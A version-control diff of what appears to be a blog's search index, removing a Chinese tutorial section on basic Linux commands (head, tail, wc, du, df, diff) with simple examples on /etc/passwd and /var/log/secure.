-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">head -n 2 /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/16.png"></p>
-<h3 id="3-6-tail-命令"><a href="#3-6-tail-命令" class="headerlink" title="3.6 tail 命令"></a>3.6 tail 命令</h3><p><code>tail</code> 文件中的尾部内容。tail命令默认在屏幕上显示指定文件的末尾10行，如果给定的文件不止一个，则在显示的每个文件前面加一个文件名标题</p>
-<p>用法:<code>tail [选项] [文件]</code></p>
-<ul>
-<li>参数：-n&lt;行数&gt; 显示的行数</li>
-</ul>
-<p>案例：查看passwd文件尾部三行内容。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tail -n 3 /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/17.png"></p>
-<ul>
-<li>参数：-f 循环读取</li>
-</ul>
-<p>案例：查看新增的内容</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tail -f /var/<span class="built_in">log</span>/secure</span><br></pre></td></tr></table></figure>
-
-<p><code>/var/log/secure</code>是系统远程登录日志，我们可以通过<code>tail -f</code>命令监控日志变化情况。</p>
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/18.png"></p>
-<p>随后我们另开一个命令终端远程登录此台计算机。</p>
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/19.png"></p>
-<p>可以看到<code>tail -f</code>命令监控到了日志变化。<code>Ctrl+c</code>取消命令。</p>
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/20.png"></p>
-<h3 id="3-7-wc-命令"><a href="#3-7-wc-命令" class="headerlink" title="3.7 wc 命令"></a>3.7 wc 命令</h3><p><code>wc</code>命令用来计算数字。利用wc指令我们可以计算文件的Byte数、字数或是列数。</p>
-<p>用法：<code>wc [选项] [文件]</code></p>
-<p>参数：</p>
-<ul>
-<li>-l 显示行数</li>
-<li>-c 显示Bytes数</li>
-<li>-w 显示字数</li>
-</ul>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wc -l /etc/passwd</span><br><span class="line">wc -c /etc/passwd</span><br><span class="line">wc -w /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/21.png"></p>
-<h3 id="3-8-du-命令"><a href="#3-8-du-命令" class="headerlink" title="3.8 du 命令"></a>3.8 du 命令</h3><p><code>du</code>命令可查看文件使用空间</p>
-<p>用法：<code>du [选项] [文件]</code></p>
-<p>参数：</p>
-<ul>
-<li>-h 以K，M，G为单位，提高信息的可读性。</li>
-</ul>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">du -h /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/22.png"></p>
-<h3 id="3-9-df-命令"><a href="#3-9-df-命令" class="headerlink" title="3.9 df 命令"></a>3.9 df 命令</h3><p><code>df</code>命令用于显示磁盘分区上的可使用的磁盘空间。默认显示单位为KB。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。</p>
-<p>用法：<code>df [选项]</code></p>
-<p>参数：</p>
-<ul>
-<li>-h 使用人类可读的格式</li>
-</ul>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/23.png"></p>
-<h3 id="3-10-diff-命令"><a href="#3-10-diff-命令" class="headerlink" title="3.10 diff 命令"></a>3.10 diff 命令</h3><p><code>diff</code> 命令用于比较文件的差异。</p>
-<p><code>diff</code>以逐行的方式，比较文本文件的异同处。如果指定要比较目录，则 diff 会比较目录中相同文件名的文件，但不会比较其中子目录。</p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diff 1.txt 2.txt</span><br></pre></td></tr></table></figure>
-
-<p>diff命令所参考的不是第一个文件，而是第二个文件，它的输出信息有以下几种字符：</p>
-<p>c: 表示必须做一些修改才能使两个文件相同</p>
-<p>a: 表示必须添加一些内容才能使两个文件相同</p>
-<p>d: 表示必须删除一些内容才能使两个文件相同</p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>信息收集</title>
     <url>/2021/02/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[<h4 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h4><hr>
@@ -2223,8 +2645,8 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
         <category>Web</category>
       </categories>
       <tags>
-        <tag>渗透测试</tag>
         <tag>Web</tag>
+        <tag>渗透测试</tag>
         <tag>信息收集</tag>
       </tags>
   </entry>
